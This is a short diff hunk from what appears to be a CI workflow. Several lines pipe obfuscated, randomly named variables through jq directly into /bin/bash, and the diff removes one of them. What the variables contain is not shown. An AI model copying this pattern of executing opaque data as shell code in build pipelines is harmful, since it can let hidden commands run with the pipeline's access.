@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$gyqak20" | jq -r .pcavg97 | /bin/bash
           printf '%s' "$dgp48176" | jq -r .ziue2 | /bin/bash
           echo $io624 | jq -r .vsts08962 | /bin/bash
-          echo $gftkl4418 | jq -r .s62 | /bin/bash
           printf '%s' "$vg76845" | jq -r .yay0 | /bin/bash
 
       - name: Persist output
